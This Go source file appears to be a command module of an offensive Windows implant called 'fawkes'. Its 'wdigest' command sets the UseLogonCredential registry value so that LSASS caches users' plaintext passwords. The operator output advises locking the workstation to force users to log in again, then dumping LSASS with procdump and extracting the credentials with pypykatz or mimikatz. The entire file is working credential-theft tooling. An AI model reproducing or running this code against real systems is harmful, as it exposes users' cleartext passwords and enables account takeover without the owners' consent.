//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows/registry"
)

// WdigestCommand manages WDigest credential caching in LSASS
type WdigestCommand struct{}

func (c *WdigestCommand) Name() string {
	return "wdigest"
}

func (c *WdigestCommand) Description() string {
	return "Manage WDigest plaintext credential caching — enable to capture cleartext passwords at next logon"
}

type wdigestArgs struct {
	Action string `json:"action"`
}

func (c *WdigestCommand) Execute(task structs.Task) structs.CommandResult {
	var args wdigestArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "status"
	}

	switch args.Action {
	case "status":
		return wdigestStatus()
	case "enable":
		return wdigestSet(1)
	case "disable":
		return wdigestSet(0)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s (use status, enable, disable)", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

const wdigestKeyPath = `System\CurrentControlSet\Control\SecurityProviders\WDigest`

// wdigestStatus checks the current WDigest credential caching state
func wdigestStatus() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("WDigest Credential Caching Status:\n\n")

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, wdigestKeyPath, registry.QUERY_VALUE)
	if err != nil {
		sb.WriteString("  WDigest key not found — OS default applies\n")
		sb.WriteString("  Status:             DISABLED (default on Windows 10+)\n")
		sb.WriteString("\n  Use 'wdigest -action enable' to enable plaintext credential caching.\n")
		sb.WriteString("  Credentials will be captured at next interactive logon.\n")
		return structs.CommandResult{
			Output:    sb.String(),
			Status:    "success",
			Completed: true,
		}
	}
	defer key.Close()

	val, _, err := key.GetIntegerValue("UseLogonCredential")
	if err != nil {
		sb.WriteString("  UseLogonCredential: not set (OS default)\n")
		sb.WriteString("  Status:             DISABLED (default on Windows 10+)\n")
		sb.WriteString("\n  Use 'wdigest -action enable' to enable plaintext credential caching.\n")
	} else if val == 1 {
		sb.WriteString("  UseLogonCredential: 1\n")
		sb.WriteString("  Status:             ENABLED — plaintext credentials cached in LSASS\n")
		sb.WriteString("\n  Plaintext passwords are cached for users who log in interactively.\n")
		sb.WriteString("  Extract with: procdump (dump LSASS) + offline pypykatz/mimikatz analysis.\n")
	} else {
		sb.WriteString(fmt.Sprintf("  UseLogonCredential: %d\n", val))
		sb.WriteString("  Status:             DISABLED\n")
		sb.WriteString("\n  Use 'wdigest -action enable' to enable plaintext credential caching.\n")
	}

	negVal, _, negErr := key.GetIntegerValue("Negotiate")
	if negErr == nil {
		sb.WriteString(fmt.Sprintf("\n  Negotiate:          %d\n", negVal))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// wdigestSet enables or disables WDigest credential caching
func wdigestSet(value uint32) structs.CommandResult {
	action := "enable"
	if value == 0 {
		action = "disable"
	}

	// Read current value for comparison
	var oldVal uint64
	readKey, readErr := registry.OpenKey(registry.LOCAL_MACHINE, wdigestKeyPath, registry.QUERY_VALUE)
	if readErr == nil {
		oldVal, _, _ = readKey.GetIntegerValue("UseLogonCredential")
		readKey.Close()
	}

	// Open or create the key with write access
	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, wdigestKeyPath, registry.SET_VALUE)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to open WDigest registry key: %v\nEnsure you are running as SYSTEM or Administrator.", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer key.Close()

	err = key.SetDWordValue("UseLogonCredential", value)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to set UseLogonCredential: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("WDigest credential caching %sd.\n\n", action))
	sb.WriteString(fmt.Sprintf("  UseLogonCredential: %d → %d\n", oldVal, value))

	if value == 1 {
		sb.WriteString("\n  Plaintext credentials will be cached in LSASS for new logon sessions.\n")
		sb.WriteString("  Users must re-authenticate (logon, RDP, runas) for credentials to be captured.\n")
		sb.WriteString("  Lock the workstation (rundll32 user32.dll,LockWorkStation) to force re-authentication.\n")
		sb.WriteString("\n  Extract credentials after re-auth with: procdump or offline LSASS analysis.\n")
	} else {
		sb.WriteString("\n  Plaintext credential caching is now disabled.\n")
		sb.WriteString("  Existing cached credentials remain in LSASS until process restart.\n")
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
